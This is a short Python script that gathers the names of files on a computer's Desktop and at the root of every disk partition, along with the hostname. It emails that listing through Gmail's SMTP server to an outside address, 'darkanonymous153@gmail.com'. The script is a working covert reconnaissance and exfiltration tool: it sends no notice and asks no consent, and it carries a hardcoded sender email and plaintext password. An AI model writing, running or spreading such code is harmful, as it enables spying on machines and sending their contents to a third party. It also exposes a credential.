import os
import smtplib
import socket 
import psutil
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication


# Get the list of files and directories in your Desktop folder
partitions = psutil.disk_partitions(all=True)
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
files_and_folders = os.listdir(desktop_path)
file_info = f"{os.linesep}".join(files_and_folders)

drive_names = []
for partition in partitions:
    file_info += f"\n\nList of files from {partition.device}:\n"
    if partition.device not in drive_names:
        drive_names.append(partition.device)
        file_info += f"{os.linesep}".join(os.listdir(partition.device + "\\"))
        #print(f"Drive {len(drive_names)}: {partition.device}")

# Specify the email address you want to send the email from
sender_email = "tasnimul.alam.cse@ulab.edu.bd"
# Specify the corresponding email's password
sender_password = "Abc153Xyz1531*"
# Specify the email address you want to send the email to
recipient_email = "darkanonymous153@gmail.com"
# Specify the email subject

current_datetime = datetime.now().strftime("%Y-%m-%d_%H-%M")
email_subject = current_datetime
# Get computer name 
computer = socket.gethostname()
# Specify the email message
email_message = f"File list from {computer}'s desktop folder :{os.linesep}"
email_message += f"\nTotal number of drives in {computer}: {len(drive_names)}\n"

# Create a message object and set its attributes
message = MIMEMultipart()
message["From"] = sender_email
message["To"] = recipient_email
message["Subject"] = email_subject
message_text = file_info
message.attach(MIMEText(email_message + message_text))

# Connect to the SMTP server
with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
    # Start the connection
    server.ehlo()
    # Re-identify ourselves over the encrypted connection
    server.ehlo()
    # Authenticate with the email server
    server.login(sender_email, sender_password)
    # Send the email
    server.sendmail(sender_email, recipient_email, message.as_string())